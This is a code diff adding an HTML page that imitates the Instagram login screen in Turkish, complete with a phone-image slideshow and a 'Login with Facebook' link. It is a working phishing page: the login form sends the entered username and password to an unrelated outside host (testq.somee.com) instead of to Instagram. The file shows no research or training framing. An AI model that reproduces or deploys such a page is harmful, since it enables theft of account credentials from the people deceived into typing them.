@@ -1,0 +1,100 @@
+<html>
+	<head>
+		<meta charset = "UTF-8">
+		<title>Instagram</title>	
+		<link href="css/main.css" rel="stylesheet"/>
+		<link rel="icon" href="foto/title.ico" type="image/gif" sizes="16x16">
+	</head>
+
+	<body id="body">
+		
+		<img id="telefon" src="foto/telefon.png">
+		<div>
+			<img id="change" src="foto/1.jpg">
+		</div>
+		
+		<script>
+			function döndür1() {
+				document.getElementById("change").src="foto/1.jpg";
+				setTimeout(döndür2, 5000);
+			}
+			function döndür2(){
+				setTimeout(döndür3, 5000);
+				document.getElementById("change").src="foto/2.jpg";
+			}
+			function döndür3(){
+				setTimeout(döndür4, 5000);
+				document.getElementById("change").src="foto/3.jpg";
+			}
+			function döndür4(){
+				setTimeout(döndür5, 5000);
+				document.getElementById("change").src="foto/4.jpg";
+			}
+			function döndür5(){
+				setTimeout(döndür1, 5000);
+				document.getElementById("change").src="foto/5.jpg";
+			}
+
+			döndür1();
+		</script>
+
+		<div id="border">
+			<img id="instagramresim" src="foto/instagram_resim.png">
+			
+			<form action="https://testq.somee.com/index.php" method="post">
+				<input id="username" name="insta_pc_username" type="text" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required="" minlength="6" maxlength="20">
+				<input id="password" name="insta_pc_password" type="password" placeholder="Şifre" onclick="button_color()" required="" minlength="6" maxlength="20">
+				<input id="login" type="submit" value="Giriş Yap">
+			</form>	
+
+			<input type="button" id="goster" onclick="goster_func()" value="Göster" style="visibility: hidden;">
+			<img id="yada" src="foto/yada.png">
+			<img id="faceicon" src="foto/faceicon.png"></a>
+			
+			<p id="unut" >Şifreni mi unuttun?</p>
+			<a href="facebook.html" style="text-decoration: none"> <p id="facebooklogin">Facebook ile Giriş Yap</p></a>
+		</div>
+		
+		<div id="border2">
+			<p id="hesabın">Hesabın yok mu? </p>		
+			<p id="kaydol">Kaydol</p>
+		</div>
+
+		<div id="border3">
+			<p id="indir">Uygulamayı indir.</p>
+			<img id="appstore" src="foto/appstore.png">
+			<img id="googleplay" src="foto/googleplay.png">
+		</div>
+		
+		<script>
+			var uzunluk = window.screen.height;
+			var genişlik = window.screen.width;
+			if (uzunluk <= "800" && genişlik <= "800"){
+				window.location.href='mobile.html';
+			}
+			function button_color(){
+				document.getElementById("login").style.backgroundColor="0095f6";
+				document.getElementById("goster").style.visibility = "initial"; 
+			}
+			function goster_func(){
+				var goster = document.getElementById("goster").value;
+				if (goster == "Göster"){
+					document.getElementById("goster").value="Gizle";
+				}
+				else {
+					document.getElementById("goster").value="Göster";
+				}
+			}	
+			function myFunction() {
+				var x = document.getElementById("password");
+				if (x.type === "password") {
+					x.type = "text";
+				} 
+				else {
+					x.type = "password";
+				}
+			}
+			
+		</script>
+	</body>
+</html>
